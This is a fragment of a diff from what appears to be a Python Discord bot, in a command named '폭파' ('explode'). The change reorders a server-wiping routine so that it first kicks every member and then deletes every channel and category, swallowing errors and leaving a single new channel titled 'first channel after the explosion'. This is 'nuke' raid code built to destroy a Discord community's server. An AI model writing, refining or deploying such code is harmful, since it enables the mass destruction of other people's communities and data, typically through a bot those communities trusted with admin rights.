@@ -306,21 +306,6 @@ async def 폭파(ctx):
                 except:
                     pass
 
-            # 모든 채널 삭제후 채널 생성
-            for channel in ctx.guild.channels:
-                try:
-                    await channel.delete()
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
-            for category in ctx.message.guild.categories:
-                try:
-                    await category.delete()
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
-            channel = await ctx.guild.create_text_channel("폭파 후 첫 채널")
-
             # 모든 멤버 강퇴
             guildMembers = ctx.guild.members
             for member in guildMembers:
@@ -330,6 +315,22 @@ async def 폭파(ctx):
                 except Exception as e:
                     print(e)
                     pass
+
+            # 모든 채널 삭제후 채널 생성
+            for channel in ctx.guild.channels:
+                try:
+                    await channel.delete()
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+
+            for category in ctx.message.guild.categories:
+                try:
+                    await category.delete()
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+            channel = await ctx.guild.create_text_channel("폭파 후 첫 채널")
 
             bombcount[serverid] = 0
         else:
